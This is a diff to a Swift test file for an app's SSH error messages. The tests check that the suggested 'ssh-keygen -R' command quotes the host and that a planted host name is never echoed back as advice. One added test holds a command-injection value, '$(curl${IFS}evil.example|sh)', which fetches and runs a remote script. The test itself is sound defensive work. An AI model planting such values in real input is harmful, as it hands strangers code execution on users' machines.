@@ -165,8 +165,18 @@ struct RemoteEngineTests {
         let said = RemoteEngineError.ssh(status: 255, message: changed).localizedDescription
         #expect(said.contains("changed"))
         // The name the key is kept under (the machine's address, not the name in ~/.ssh/config).
-        #expect(said.contains("ssh-keygen -R 192.168.1.100"))
+        #expect(said.contains("ssh-keygen -R '192.168.1.100'"))
         #expect(!said.contains("doesn't know"))
+        // On another port, ssh names it [address]:port, which zsh would take as a pattern unquoted.
+        let port = changed.replacingOccurrences(of: "Host key for 192.168.1.100", with: "Host key for [10.0.0.5]:2222")
+        #expect(RemoteEngineError.ssh(status: 255, message: port).localizedDescription.contains("ssh-keygen -R '[10.0.0.5]:2222'"))
+        // A name only the machine's own text could have put there (it isn't an address) is never
+        // advised: what's pasted in Terminal must be what this Mac wrote.
+        let planted = "Host key for $(curl${IFS}evil.example|sh) has changed and you have requested strict checking.\n" + changed
+            .replacingOccurrences(of: "Host key for 192.168.1.100 has changed and you have requested strict checking.\n", with: "")
+        let advice = RemoteEngineError.ssh(status: 255, message: planted).localizedDescription
+        #expect(!advice.contains("curl"))
+        #expect(advice.contains("ssh-keygen -R and the machine's address"))
         let unknown = "No ED25519 host key is known for box and you have requested strict checking.\nHost key verification failed."
         #expect(RemoteEngineError.ssh(status: 255, message: unknown).localizedDescription.contains("doesn't know the machine's host key yet"))
     }
